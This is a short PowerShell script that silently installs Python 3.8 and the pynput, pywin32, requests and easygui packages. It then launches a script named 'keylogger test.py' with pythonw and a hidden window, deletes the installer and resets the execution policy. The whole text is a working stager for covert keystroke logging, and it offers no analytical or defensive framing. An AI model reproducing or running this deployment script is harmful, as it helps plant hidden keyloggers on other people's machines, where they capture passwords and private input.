[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
wget "https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe" -outfile "python-3.8.0.exe"
.\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
pip install pynput
pip install pywin32
pip install requests
pip install easygui
pythonw python keylogger test.py
powershell -WindowStyle Hidden
Remove-Item .\python-3.8.0.exe
Set-ExecutionPolicy Default
Set-ExecutionPolicy -scope CurrentUser Default